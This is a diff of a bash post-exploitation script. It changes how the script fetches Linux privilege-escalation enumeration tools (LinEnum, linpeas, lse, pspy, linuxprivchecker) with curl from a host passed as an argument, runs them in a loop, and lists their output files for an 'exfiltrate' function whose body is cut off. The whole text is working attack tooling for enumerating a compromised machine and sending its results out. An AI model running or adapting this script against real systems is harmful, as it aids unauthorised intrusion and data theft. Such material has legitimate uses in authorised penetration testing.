@@ -73,29 +73,34 @@ download()
 	curl $1/LinEnum.sh
 	
 	echo "\n#### Downloading psspy ####\n"
-	wget $1/psspy
+	curl $1/psspy
 	
 	echo "\n#### Downloading linux-priv-checker ####\n"
-	wget $1/linuxprivchecker.py
+	curl $1/linuxprivchecker.py
 	
 	echo "\n#### Downloading linpeas.sh ####\n"
-	wget $1/linpeas.sh
+	curl $1/linpeas.sh
+	
+	echo "\n#### Downloading lse.sh ####\n"
+	curl $1/lse.sh
 }
 
 # Execute enum scripts
 execute()
 {
-	echo "\n#### Run LinEnum.sh ####\n"
-	bash LinEnum.sh -r > lineunum.txt
+	scripts=("LinEnum.sh" "linpeas.sh" "lse.sh")
 	
-	echo "\n#### Run linpeas.sh ####\n"
-	bash linpeas.sh > linpeas.txt
+	for script in "${scripts[@]}"
+	do
+		echo "\n#### Run $script ####\n"
+		bash $script > $script.txt
+	done
 }
 
 # Exfiltrate enum script results
 exfiltrate()
 {
-	files=("lineunum.txt" "linpeas.txt")
+	files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt")
 	
 	for file in "${files[@]}"
 	do
